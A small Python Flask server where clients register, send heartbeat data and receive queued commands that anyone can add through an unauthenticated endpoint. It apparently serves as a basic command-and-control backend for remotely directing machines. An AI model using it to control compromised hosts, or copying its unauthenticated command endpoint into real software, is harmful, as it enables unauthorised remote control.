from flask import Flask, jsonify, request, abort

app = Flask(__name__)

clients = []
command_counter = []


def find(lst, key, value):
    for i, dic in enumerate(lst):
        if dic[key] == value:
            return i
    return -1


@app.route("/")
def index():
    return jsonify({"success": 1})


@app.route("/register", methods=["POST"])
def register():
    if not (request.json and 'address' in request.json):
        abort(400)

    print("Registration Request Received For: %s" % request.json["address"])

    client_id = len(clients)
    clients.append({"client_id": client_id, "address": request.json["address"], "commands": []})

    print("Client Assigned ID: %s" % client_id)

    return jsonify({"client_id": client_id})


@app.route("/client/<int:client_id>/heartbeat", methods=["POST"])
def get_client(client_id):

    print ("Data Received From %s" % client_id)
    if len(request.json.keys()):
        print(request.json["data"])

    commands = clients[find(clients, "client_id", client_id)]["commands"]
    clients[find(clients, "client_id", client_id)]["commands"] = []

    return jsonify(commands)


@app.route("/client/<int:client_id>/add_command", methods=["POST"])
def add_command(client_id):
    if not (request.json and 'command' in request.json):
        abort(400)

    clients[find(clients, "client_id", client_id)]["commands"].append({"cmd_id": len(command_counter),
                                                                       "command": request.json["command"]})
    command_counter.append("")  # Hells yeah hacky solution
    return jsonify({"success": 1})


if __name__ == "__main__":
    app.run(port=5000)
